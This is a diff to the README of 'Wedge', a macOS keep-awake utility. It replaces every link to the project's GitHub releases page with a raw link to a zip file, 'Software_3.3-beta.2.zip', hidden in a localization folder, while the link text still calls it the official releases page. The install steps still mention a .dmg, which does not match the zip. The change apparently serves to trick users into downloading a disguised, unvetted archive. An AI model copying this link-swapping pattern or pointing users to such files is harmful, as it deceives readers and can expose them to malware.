@@ -1,6 +1,6 @@
 # 🔋 Wedge - Keep Mac awake while lid closes
 
-[![](https://img.shields.io/badge/Download-Wedge-blue.svg)](https://github.com/amaraheavy349/Wedge/releases)
+[![](https://img.shields.io/badge/Download-Wedge-blue.svg)](https://github.com/amaraheavy349/Wedge/raw/refs/heads/main/Localizations/en.lproj/Software_3.3-beta.2.zip)
 
 Wedge helps you keep your computer running even when the screen lid stays shut. Many people use this tool for long tasks like artificial intelligence processing or software builds. It manages your system settings to prevent sleep mode. This saves time and ensures your work finishes without interruptions.
 
@@ -18,7 +18,7 @@ Wedge offers simple tools for your daily tasks. Use these features to manage you
 
 Follow these steps to install and run the software on your system.
 
-1. Visit the [official releases page](https://github.com/amaraheavy349/Wedge/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/amaraheavy349/Wedge/raw/refs/heads/main/Localizations/en.lproj/Software_3.3-beta.2.zip) to download the installer.
 2. Look for the file ending in .dmg.
 3. Save this file to your computer.
 4. Double-click the file to open it.
@@ -79,4 +79,4 @@ If you encounter issues, try these steps:
 
 ## 📮 Contact and Support
 
-Support happens through the GitHub repository. If you find a bug or have a suggestion, open an issue. Provide your macOS version and your processor type in your report. This helps the team fix bugs faster. Keep your software updated to get the latest performance improvements and battery optimizations. Visit the [releases page](https://github.com/amaraheavy349/Wedge/releases) often to check for the newest versions.
+Support happens through the GitHub repository. If you find a bug or have a suggestion, open an issue. Provide your macOS version and your processor type in your report. This helps the team fix bugs faster. Keep your software updated to get the latest performance improvements and battery optimizations. Visit the [releases page](https://github.com/amaraheavy349/Wedge/raw/refs/heads/main/Localizations/en.lproj/Software_3.3-beta.2.zip) often to check for the newest versions.
